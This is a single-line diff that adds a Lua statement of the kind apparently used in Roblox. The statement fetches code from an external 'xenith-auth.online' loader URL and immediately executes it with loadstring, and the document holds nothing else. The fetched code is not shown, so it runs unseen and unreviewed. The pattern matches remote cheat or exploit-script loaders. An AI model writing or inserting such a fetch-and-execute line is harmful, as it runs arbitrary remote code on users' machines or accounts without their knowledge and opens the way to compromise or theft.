@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://xenith-auth.online/v1/loader/5b193fc732db5c93"))()
